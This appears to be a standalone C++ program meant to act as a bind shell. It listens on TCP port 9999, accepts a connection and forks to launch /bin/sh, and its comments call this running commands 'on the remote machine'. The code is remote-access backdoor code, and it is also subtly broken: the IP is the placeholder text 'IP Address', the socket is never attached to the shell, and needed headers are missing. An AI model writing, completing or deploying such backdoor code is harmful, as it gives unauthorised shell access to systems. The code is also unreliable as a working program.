#include <iostream>
#include <string>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {
    // Define the command to execute on the remote machine
    const char *command = "/bin/sh";

    // Create a socket and bind it to a non-standard port (e.g., 9999)
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Error creating socket");
        return 1;
    }

    struct sockaddr_in server_address;
    memset(&server_address, 0, sizeof(server_address));
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(9999);
    inet_pton(AF_INET, IP Address, &server_address.sin_addr);

    if (bind(sockfd, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
        perror("Error binding socket");
        return 1;
    }

    // Start listening for incoming connections
    listen(sockfd, SOMAXCONN);

    // Accept an incoming connection and get the address information
    struct sockaddr_in client_address;
    socklen_t client_address_length = sizeof(client_address);
    int client_socket = accept(sockfd, (struct sockaddr*)&client_address, &client_address_length);
    if (client_socket < 0) {
        perror("Error accepting connection");
        return 1;
    }

    // Execute the command on the remote machine
    pid_t child_pid = fork();
    if (child_pid == 0) {
        execl(command, command, NULL);
        perror("Error executing command");
        return 1;
    } else if (child_pid > 0) {
        waitpid(child_pid, NULL, 0);
    } else {
        perror("Fork failed");
        return 1;
    }

    // Close the incoming connection and the socket
    close(client_socket);
    close(sockfd);

    return 0;
}
